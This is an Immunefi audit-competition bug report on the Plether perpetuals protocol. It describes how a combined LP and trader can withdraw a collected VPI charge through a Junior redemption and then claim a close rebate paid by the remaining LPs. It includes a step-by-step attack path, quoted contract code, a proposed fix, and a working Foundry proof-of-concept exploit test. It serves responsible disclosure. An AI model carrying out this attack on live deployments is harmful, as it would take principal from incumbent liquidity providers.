# \#98901 [SC-Critical] Redeemable VPI charges let an LP/trader shift a later rebate onto remaining Junior LPs

**Submitted on Nov 10th 2026 at 20:26:46 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98901
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

HousePool lets an LP redeem the cash collected as a positive VPI charge on that LP's own open position while the position can still receive a matching rebate on close. A trader who also owns Junior shares can take the charge out through LP redemption, then close at the same neutral basket mark and receive the rebate from the remaining pool. The resulting cash transfer reduces other Junior LPs' redeemable principal.

## Vulnerability Details

### Root cause in the frozen production source

The affected version is `a82d4fefb02768e5b3bddcc97dee371eee24fea8` in `packages/perps/src`. The open settlement sends a positive trade cost to HousePool and records the cash as claimant revenue. In `CfdEngineSettlementSidecar.sol`, the relevant production code is:

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

`HousePool.recordClaimantInflow` adds arrived cash to `accountedAssets`, so it enters `totalAssets()` and the LP settlement snapshot. The base withdrawal reservation in `HousePoolAccountingLib.buildWithdrawalSnapshot` contains the side payout envelope, trader claims, and supplemental reserve, but no amount for a positive VPI charge that the live position may later reclaim:

```solidity
snapshot.physicalAssets = engineSnapshot.physicalAssets;
snapshot.maxLiability = engineSnapshot.maxLiabilityAssets;
snapshot.reserved = engineSnapshot.maxLiabilityAssets + engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.supplementalReservedAssets;
snapshot.freeAssets =
    snapshot.physicalAssets > snapshot.reserved ? snapshot.physicalAssets - snapshot.reserved : 0;
```

The existing dedicated VPI reserve addresses the opposite case: negative accrued VPI that the trader owes the pool. `CfdEngineSettlementSidecar._negativeVpiReserveTarget` returns zero when accrued VPI is positive:

```solidity
function _negativeVpiReserveTarget(
    int256 vpiAccruedAssets
) private pure returns (uint256 targetAssets) {
    if (vpiAccruedAssets < 0) {
        targetAssets = uint256(-(vpiAccruedAssets + 1)) + 1;
    }
}
```

The corresponding close remains eligible for a rebate up to its positive accrued VPI. `CloseAccountingLib.buildCloseState` applies the lifetime clamp to the position, without binding that rebate to cash retained after LP exits:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The close planner pays the action rebate from free pool cash, and the settlement sidecar transfers it to the trader's clearinghouse balance:

```solidity
if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
    delta.actionRebateWaivedAssets = delta.actionRebateAssets - delta.actionRebatePaidAssets;
    poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
}
```

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

The missing boundary is between the open's *realized cash inflow*, which can increase an LP redemption, and the position's still-available *future rebate*, which is paid after that LP has left. The lifetime clamp can make the trader's VPI round trip nonnegative while the combined LP/trader account still extracts value from other LPs.

### Attack path

1. The attacker supplies Junior liquidity and funds a separate trading balance from the same address. Other Junior LPs remain in the pool.
2. Through the public V3 Router order path, the attacker opens a skew-increasing SHORT. Its positive VPI charge reaches HousePool and raises the cash available in the LP settlement snapshot.
3. After the ordinary vault cooldown and epoch boundary, the attacker requests, settles, and claims its Junior redemption. The withdrawal includes the attacker's share of the collected VPI while the SHORT remains open.
4. The attacker submits a public V3 close against the same neutral basket mark. The close's negative VPI is allowed by the lifetime clamp and paid from the HousePool cash left behind.
5. The attacker withdraws the trader balance. The remaining Junior LPs bear the rebate outflow; an incumbent LP can redeem less USDG than it contributed.

The attacker uses no owner, guardian, oracle-worker, or privileged keeper authority. Order execution, mark refresh, and LP epoch settlement are permissionless under the competition rules.

### Distinction from public disclosures and remediation

The October AI scan's “Temporary pool-liquidity reduction can amplify a skew-reducing close rebate” concerns a smaller **close-time VPI depth denominator**. Here the charge is withdrawn *before* the rebate is paid. Returning HousePool to its original depth before close leaves the extraction intact, because restoring the denominator does not restore the withdrawn charge to the remaining LPs. The PoC includes this control. The earlier public VPI clamp fix bounds the trader's lifetime VPI; it does not account for a second role that withdraws the open charge as LP value. PR #62 describes VPI as separate from terminal price PnL, but does not describe or prevent this open-charge, LP-exit, close-rebate cash transfer.

Preserve the portion of collected positive VPI that can be rebated while its position remains live, or include that contingent payment in the LP withdrawal and ownership snapshot. Release the reservation as the position's rebate eligibility is consumed, with the same treatment in live settlement and previews.

## Impact Details

**Selected in-scope impact: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.** The affected asset is active LP USDG held by `HousePool.sol`; the exposed holders are incumbent Junior LPs. The attacker receives more USDG across its LP redemption and trader withdrawal than it supplied, while an incumbent Junior LP's funded redemption returns less than its contributed principal. The transfer requires no favorable market move or unpaid trader claim. `TrancheVault.sol` is the public redemption route, and the Engine's close settlement pays the rebate from HousePool.


## Proof of Concept

## PoC Explanation

Place the attached single Solidity file at `packages/perps/test/perps/spec/PletherVpiLpRebatePoC.t.sol` in a checkout of the frozen commit. From the repository root, run:

```bash
FOUNDRY_VIA_IR=true forge test --root packages/perps --match-path test/perps/spec/PletherVpiLpRebatePoC.t.sol -vv
```

Expected result: three passing tests. `test_routerPath_lpRedeemsBetweenOpenAndRebateClose` exercises the public V3 `commitOrder(OrderRequest)` and `executeOrder` calls, public vault requests and claims, and `settleLpEpoch`. The attacker deposits 1,000,000 USDG as Junior LP through the public vault and Router flow and 100,000 USDG in its trader account against a 1,000,000 USDG incumbent Junior deposit, in addition to the test harness's seed positions. It opens and closes a SHORT against the same neutral basket mark of `1e8` with release VPI, skew, margin, and fee settings. The six mocked feed IDs, weights, bases, and inversion flags match the release basket; each mocked component has approximately a one-basis-point confidence ratio and the Router is configured with the release adverse-confidence multiplier. The test observes a 1,593.290516 USDG accrued VPI charge, 1,000,806.197421 USDG received in attacker LP redemption, and the sidecar's `ActionRebateSettled` event records 1,273.818488 USDG actually paid on close with none waived. The combined attacker token surplus is 123.792517 USDG before network gas and live Pyth fees. The incumbent's eligible shares are subsequently redeemed and pay 999,555.393280 USDG against its 1,000,000 USDG redeemable deposit. This claim uses `maxRequestRedeem`, which excludes the harness's locked Junior seed shares. No trader claim remains.

`test_routerPath_controlRedeemAfterClose` keeps the same opening, cooldown, LP request timing, and neutral basket mark but closes before funding the attacker's redemption; the combined attacker result is negative 501.860250 USDG. In that control, the incumbent's redeemable deposit pays 1,000,180.421025 USDG, above its contributed principal. Funding the attacker redemption before the close lowers the incumbent's payment by 625.027745 USDG and takes it below principal. `test_profitSurvivesRestoredCloseDepth` has another ordinary LP deposit enough cash after the attacker's redemption to restore the exact pre-redemption `HousePool.totalAssets()` before the close; the combined attacker result remains positive 118.974990 USDG. That control isolates the withdrawal of an already collected VPI charge from the public scan's lower-close-depth mechanism.

The test uses the repository's `BasePerpTest` to deploy unchanged in-scope contracts locally. That base harness deploys a test subclass of `OrderRouter`; the PoC calls its inherited production V3 `commitOrder(OrderRequest)` selector, not the subclass's scalar adapter. The harness creates the initial incumbent LP position with its internal setup helper. The PoC's `setUp` replaces the base harness's two-feed oracle with the release six-feed configuration through the normal timelock solely to construct the fixture; the exploit steps use no owner action. `MockPyth` and the test settlement token are controlled dependencies outside the in-scope source. The PoC does not execute a public-chain transaction or measure network gas and live oracle-update fees.

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice Router-path VPI charge/rebate LP redemption test at a normal basket mark.
/// @dev Installs the release six-feed basket in setUp; attacker steps use public Router and vault methods.
contract PletherVpiLpRebatePoC is BasePerpTest {

    bytes32[6] internal releaseIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] internal releaseWeights = [uint256(576e15), 136e15, 119e15, 91e15, 42e15, 36e15];
    uint256[6] internal releaseBases =
        [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
    bool[6] internal releaseInverted = [false, true, false, true, true, true];

    function setUp() public override {
        super.setUp();
        // Recreate the release oracle geometry in this repository's two-feed base harness.
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        for (uint256 i; i < 6; ++i) {
            ids[i] = releaseIds[i];
            weights[i] = releaseWeights[i];
            bases[i] = releaseBases[i];
            inversions[i] = releaseInverted[i];
        }
        PletherOracle releaseOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.adverseConfidenceMultiplierBps = 2500;
        releaseRouterConfig.minOpenNotionalAssets = 1000e6;
        releaseRouterConfig.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(releaseRouterConfig);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        pletherOracle = releaseOracle;
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);
        vm.warp(vm.getBlockTimestamp() + 4 days);
        assertFalse(engine.isOracleFrozen());
        router.updateMarkPrice(_releaseUpdateData(1e8));
    }

    function _releaseUpdateData(
        uint256 targetMark
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime =
            router.nextExecuteId() < router.nextCommitId() ? _mockHistoricalPublishTime() : vm.getBlockTimestamp();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw =
                releaseInverted[i] ? 1e24 / (releaseBases[i] * targetMark) : releaseBases[i] * targetMark / 1e8;
            feeds[i] = MockPyth.FeedUpdate(
                releaseIds[i],
                MockPyth.MockPrice(
                    int64(uint64(raw)), uint64(raw / 10_000), -8, publishTime, publishTime == 0 ? 0 : publishTime - 1
                )
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feeds);
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1_000_000,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant RESTORER = address(0xB0B);
    uint256 internal constant VICTIM_JUNIOR = 1_000_000e6;
    uint256 internal constant ATTACKER_JUNIOR = 1_000_000e6;
    uint256 internal constant ATTACKER_TRADER = 100e9;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return VICTIM_JUNIOR;
    }

    function _fundJuniorViaRouter(
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 depositId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 activation = juniorVault.depositEpochStart(depositId);
        if (vm.getBlockTimestamp() < activation) {
            vm.warp(activation);
        }
        router.settleLpEpoch(_releaseUpdateData(1e8));
        uint256 claimableAssets = juniorVault.claimableDepositRequest(depositId, lp);
        assertEq(claimableAssets, amount, "public LP deposit must be fully funded");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(depositId, claimableAssets, lp, lp);
        assertGt(shares, 0, "public LP deposit must mint shares");
    }

    function _commitShort(
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: CfdTypes.Side.SHORT,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ATTACKER);
        orderId = router.commitOrder(request);
    }

    function test_routerPath_lpRedeemsBetweenOpenAndRebateClose() public {
        uint256 victimShares = juniorVault.balanceOf(address(this));
        uint256 victimValueBefore = juniorVault.convertToAssets(victimShares);

        _fundJuniorViaRouter(ATTACKER, ATTACKER_JUNIOR);
        _fundTrader(ATTACKER, ATTACKER_TRADER);

        uint256 poolAfterLp = pool.totalAssets();
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);

        // Public router mark refresh at the release basket's base mark.
        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_releaseUpdateData(1e8));
        assertEq(engine.lastMarkPrice(), 1e8, "router mark must equal base mark");

        uint256 targetNotional = poolAfterLp * 399 / 1000;
        uint256 lots = (targetNotional * 1e20 / 1e8) / 1e20;
        uint256 size = lots * 1e20;
        uint256 margin = 30e9;

        // Public open path: commit and execute by the attacker.
        uint64 openId = _commitShort(size, margin, type(uint256).max, false);
        bytes[] memory openPyth = _releaseUpdateData(1e8);
        router.executeOrder(openId, openPyth);

        (uint256 posSize, uint256 posMargin,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        emit log_named_uint("router pool after LP deposits", poolAfterLp);
        emit log_named_uint("router short size", posSize);
        emit log_named_uint("router short margin", posMargin);
        emit log_named_int("router attacker vpiAccrued after open", vpiAccrued);
        emit log_named_uint("router long maxProfit", longMax);
        emit log_named_uint("router short maxProfit", shortMax);
        emit log_named_uint("router pool after open", pool.totalAssets());
        assertEq(posSize, size);
        assertGt(vpiAccrued, 0, "open must accrue a positive VPI charge");
        assertGt(shortMax, 0, "short at normal mark has positive endpoint profit envelope");

        // Wait out the share cooldown, then settle the redeem epoch through the public router.
        uint256 unlockTime = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlockTime) {
            vm.warp(unlockTime);
        }
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        uint256 redeemActivation = juniorVault.depositEpochStart(redeemId);
        if (vm.getBlockTimestamp() < redeemActivation) {
            vm.warp(redeemActivation);
        }
        router.settleLpEpoch(_releaseUpdateData(1e8));

        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(claimableShares, attackerShares, "all attacker shares must be funded");
        uint256 cashBeforeClaim = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, claimableShares, ATTACKER, ATTACKER);
        uint256 redeemedAssets = settlementToken.balanceOf(ATTACKER) - cashBeforeClaim;
        emit log_named_uint("router attacker redeemed assets", redeemedAssets);
        assertGt(redeemedAssets, ATTACKER_JUNIOR, "attacker redemption must include its VPI share");

        // Public close path at the same mark.
        uint64 closeId = _commitShort(size, 0, 1, true);
        bytes[] memory closePyth = _releaseUpdateData(1e8);
        vm.recordLogs();
        router.executeOrder(closeId, closePyth);
        Vm.Log[] memory closeLogs = vm.getRecordedLogs();
        bytes32 rebateTopic = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");
        bool rebateSeen;
        for (uint256 i; i < closeLogs.length; ++i) {
            if (
                closeLogs[i].emitter == address(engine.settlementSidecar()) && closeLogs[i].topics.length == 2
                    && closeLogs[i].topics[0] == rebateTopic
                    && closeLogs[i].topics[1] == bytes32(uint256(uint160(ATTACKER)))
            ) {
                (uint256 assessed, uint256 paid, uint256 waived) =
                    abi.decode(closeLogs[i].data, (uint256, uint256, uint256));
                emit log_named_uint("router close action rebate assessed", assessed);
                emit log_named_uint("router close action rebate paid", paid);
                assertGt(assessed, 0, "close must assess a rebate");
                assertGt(paid, 0, "close must pay a rebate from HousePool");
                assertEq(waived, 0, "rebate must not be waived in this fixture");
                rebateSeen = true;
            }
        }
        assertTrue(rebateSeen, "sidecar must emit a paid action rebate");

        (uint256 shortSizeAfter,,,,,,) = engine.positions(ATTACKER);
        assertEq(shortSizeAfter, 0, "short must be fully closed");

        uint256 attackerClearingBalance = clearinghouse.balanceAssets(ATTACKER);
        emit log_named_uint("router attacker clearing balance after close", attackerClearingBalance);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackerClearingBalance);

        uint256 finalCash = settlementToken.balanceOf(ATTACKER);
        int256 netProfit = int256(finalCash) - int256(ATTACKER_JUNIOR) - int256(ATTACKER_TRADER);
        emit log_named_uint("router attacker final cash", finalCash);
        emit log_named_int("router attacker net profit", netProfit);
        emit log_named_uint("router pool after close", pool.totalAssets());
        emit log_named_uint("router total trader claims", engine.totalTraderClaimBalanceAssets());

        uint256 victimSharesAfter = juniorVault.balanceOf(address(this));
        uint256 victimValueAfter = juniorVault.convertToAssets(victimSharesAfter);
        emit log_named_uint("router victim value before", victimValueBefore);
        emit log_named_uint("router victim value after", victimValueAfter);
        emit log_named_int("router victim value loss", int256(victimValueBefore) - int256(victimValueAfter));

        assertGt(netProfit, 0, "router-path attacker must profit");
        assertGt(victimValueBefore, victimValueAfter, "remaining LP value must be diluted");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no unbacked claim");

        uint256 victimCashBefore = settlementToken.balanceOf(address(this));
        uint256 victimRequestShares = juniorVault.maxRequestRedeem(address(this));
        uint256 victimRedeemId = juniorVault.requestRedeem(victimRequestShares, address(this), address(this));
        uint256 victimActivation = juniorVault.depositEpochStart(victimRedeemId);
        if (vm.getBlockTimestamp() < victimActivation) {
            vm.warp(victimActivation);
        }
        router.settleLpEpoch(_releaseUpdateData(1e8));
        uint256 victimClaimableShares = juniorVault.claimableRedeemRequest(victimRedeemId, address(this));
        juniorVault.claimRedeem(victimRedeemId, victimClaimableShares, address(this), address(this));
        uint256 victimPaid = settlementToken.balanceOf(address(this)) - victimCashBefore;
        emit log_named_uint("victim paid after attack", victimPaid);
        assertEq(victimClaimableShares, victimRequestShares, "victim must receive full funded claim");
        assertLt(victimPaid, VICTIM_JUNIOR, "victim loses redeemable contributed principal");
    }

    function test_routerPath_controlRedeemAfterClose() public {
        _fundJuniorViaRouter(ATTACKER, ATTACKER_JUNIOR);
        _fundTrader(ATTACKER, ATTACKER_TRADER);

        uint256 poolAfterLp = pool.totalAssets();
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);

        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_releaseUpdateData(1e8));
        assertEq(engine.lastMarkPrice(), 1e8, "router mark must equal base mark");

        uint256 targetNotional = poolAfterLp * 399 / 1000;
        uint256 lots = (targetNotional * 1e20 / 1e8) / 1e20;
        uint256 size = lots * 1e20;

        uint64 openId = _commitShort(size, 30e9, type(uint256).max, false);
        router.executeOrder(openId, _releaseUpdateData(1e8));

        uint256 unlockTime = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlockTime) {
            vm.warp(unlockTime);
        }
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        uint256 redeemActivation = juniorVault.depositEpochStart(redeemId);
        if (vm.getBlockTimestamp() < redeemActivation) {
            vm.warp(redeemActivation);
        }
        // Match the attack's cooldown and LP request timing; reverse only close versus redemption funding.
        uint64 closeId = _commitShort(size, 0, 1, true);
        router.executeOrder(closeId, _releaseUpdateData(1e8));
        router.settleLpEpoch(_releaseUpdateData(1e8));

        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        uint256 cashBeforeClaim = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, claimableShares, ATTACKER, ATTACKER);
        uint256 redeemedAssets = settlementToken.balanceOf(ATTACKER) - cashBeforeClaim;

        uint256 attackerClearingBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackerClearingBalance);
        uint256 finalCash = settlementToken.balanceOf(ATTACKER);
        int256 netProfit = int256(finalCash) - int256(ATTACKER_JUNIOR) - int256(ATTACKER_TRADER);

        emit log_named_uint("router control redeemed assets", redeemedAssets);
        emit log_named_uint("router control final cash", finalCash);
        emit log_named_int("router control net profit", netProfit);
        assertLt(netProfit, 0, "router-path redeem-after-close must not profit");

        uint256 victimCashBefore = settlementToken.balanceOf(address(this));
        uint256 victimRequestShares = juniorVault.maxRequestRedeem(address(this));
        uint256 victimRedeemId = juniorVault.requestRedeem(victimRequestShares, address(this), address(this));
        uint256 victimActivation = juniorVault.depositEpochStart(victimRedeemId);
        if (vm.getBlockTimestamp() < victimActivation) {
            vm.warp(victimActivation);
        }
        router.settleLpEpoch(_releaseUpdateData(1e8));
        uint256 victimClaimableShares = juniorVault.claimableRedeemRequest(victimRedeemId, address(this));
        juniorVault.claimRedeem(victimRedeemId, victimClaimableShares, address(this), address(this));
        uint256 victimPaid = settlementToken.balanceOf(address(this)) - victimCashBefore;
        emit log_named_uint("control victim paid", victimPaid);
        assertEq(victimClaimableShares, victimRequestShares, "control victim claim must be fully funded");
        assertGt(victimPaid, VICTIM_JUNIOR, "control victim must recover principal");
    }

    function test_profitSurvivesRestoredCloseDepth() public {
        _fundJuniorViaRouter(ATTACKER, ATTACKER_JUNIOR);
        _fundTrader(ATTACKER, ATTACKER_TRADER);
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);

        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_releaseUpdateData(1e8));
        uint256 targetNotional = pool.totalAssets() * 399 / 1000;
        uint256 lots = (targetNotional * 1e20 / 1e8) / 1e20;
        uint256 size = lots * 1e20;

        uint64 openId = _commitShort(size, 30e9, type(uint256).max, false);
        router.executeOrder(openId, _releaseUpdateData(1e8));
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        assertGt(vpiAccrued, 0, "open must collect VPI");
        uint256 depthBeforeRedemption = pool.totalAssets();

        uint256 unlockTime = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlockTime) {
            vm.warp(unlockTime);
        }
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        uint256 redeemActivation = juniorVault.depositEpochStart(redeemId);
        if (vm.getBlockTimestamp() < redeemActivation) {
            vm.warp(redeemActivation);
        }
        router.settleLpEpoch(_releaseUpdateData(1e8));
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, claimableShares, ATTACKER, ATTACKER);
        assertLt(pool.totalAssets(), depthBeforeRedemption);

        // This diagnostic LP restores the original execution depth before the close.
        uint256 restorationAssets = depthBeforeRedemption - pool.totalAssets();
        settlementToken.mint(RESTORER, restorationAssets);
        vm.startPrank(RESTORER);
        settlementToken.approve(address(juniorVault), restorationAssets);
        uint256 depositId = juniorVault.requestDeposit(restorationAssets, RESTORER, RESTORER);
        vm.stopPrank();
        uint256 depositActivation = juniorVault.depositEpochStart(depositId);
        if (vm.getBlockTimestamp() < depositActivation) {
            vm.warp(depositActivation);
        }
        router.settleLpEpoch(_releaseUpdateData(1e8));
        uint256 claimableAssets = juniorVault.claimableDepositRequest(depositId, RESTORER);
        vm.prank(RESTORER);
        juniorVault.claimDeposit(depositId, claimableAssets, RESTORER, RESTORER);
        assertEq(pool.totalAssets(), depthBeforeRedemption, "close depth restored");

        uint64 closeId = _commitShort(size, 0, 1, true);
        router.executeOrder(closeId, _releaseUpdateData(1e8));
        uint256 clearingBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, clearingBalance);

        int256 netProfit =
            int256(settlementToken.balanceOf(ATTACKER)) - int256(ATTACKER_JUNIOR) - int256(ATTACKER_TRADER);
        emit log_named_uint("depth before redemption and close", depthBeforeRedemption);
        emit log_named_int("depth-restored attacker net profit", netProfit);
        assertGt(netProfit, 0, "profit must survive without lower close depth");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
    }

}
```
